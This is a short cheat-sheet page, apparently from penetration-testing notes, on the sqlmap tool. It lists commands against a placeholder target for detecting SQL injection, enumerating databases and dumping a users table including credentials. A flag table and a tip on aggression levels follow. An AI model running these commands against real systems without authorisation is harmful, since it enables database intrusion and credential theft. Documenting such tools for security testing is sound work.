---
title: sqlmap
sidebar_position: 9
tags: [tool, exploitation, sql-injection]
---

> **One-liner:** Automated SQL injection detection and exploitation tool that can enumerate databases and dump tables.

## When to use it

- Testing a GET or POST parameter for SQL injection
- Enumerating database structure after confirming injectable input
- Dumping table contents (e.g. users, credentials)
- Blind injection scenarios where no visible output is returned

## Key commands

```bash
# GET-based injection
sqlmap -u "http://target/search?q=test" --batch --level=3 --risk=2 --dbs

# POST-based injection
sqlmap -u "http://target/login" --data="username=admin&password=test" --batch --level=3 --risk=2

# Authenticated scan (add session cookie)
sqlmap -u "http://target/search?q=test" --cookie="session=abc123" --batch --dbs

# Enumerate databases
sqlmap -u "http://target/search?q=test" --batch --dbs

# Dump a specific table
sqlmap -u "http://target/search?q=test" -D database_name -T users --dump

# Force blind time-based technique
sqlmap -u "http://target/search?q=test" --technique=T --batch
```

### Key flags

| Flag | Meaning |
|------|---------|
| `--batch` | No interactive prompts — use defaults |
| `--level` | Test depth 1–5 (higher = more payloads) |
| `--risk` | Aggression 1–3 (higher = more disruptive payloads) |
| `--dbs` | Enumerate all databases |
| `-D` / `-T` | Specify database / table to target |
| `--dump` | Extract table contents |
| `--technique=T` | Use blind time-based injection only |
| `--cookie` | Pass a session cookie for authenticated testing |

:::tip 💡 Remember
Start with `--level=3 --risk=2` — level 1 misses many real-world injection points, but level 5 risk 3 can damage data.
:::
